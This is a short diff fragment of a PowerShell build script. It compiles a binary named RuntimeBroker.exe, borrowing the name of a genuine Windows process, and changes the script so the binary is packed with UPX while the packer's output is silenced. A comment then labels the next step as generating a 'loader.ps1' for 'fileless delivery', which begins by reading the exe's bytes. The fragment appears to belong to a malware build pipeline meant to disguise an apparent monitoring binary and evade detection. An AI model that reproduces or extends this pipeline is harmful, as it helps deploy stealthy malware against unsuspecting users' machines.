@@ -19,7 +19,7 @@ if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Write-O
 git checkout -- monitor.cpp
 
 # Remove-Item -Force version.res -ErrorAction SilentlyContinue
-# upx --ultra-brute RuntimeBroker.exe
+upx --ultra-brute RuntimeBroker.exe 2>&1 | Out-Null
 
 # Generate loader.ps1 (fileless delivery)
 $exeBytes = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
